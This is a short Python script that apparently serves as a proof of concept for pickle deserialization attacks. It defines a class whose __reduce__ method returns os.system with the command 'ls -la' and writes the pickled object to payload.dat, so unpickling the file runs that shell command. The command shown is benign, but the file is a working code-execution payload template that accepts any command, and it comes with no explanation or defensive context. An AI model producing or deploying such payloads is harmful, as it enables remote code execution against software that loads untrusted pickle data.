#!/usr/bin/python3

import pickle
import os

class payload:
	def __reduce__(self):
		cmd = ('ls -la')
		return os.system, (cmd,)

f = open("payload.dat", "wb")

payload_object = payload()

pickle.dump(payload_object, f)

f.close()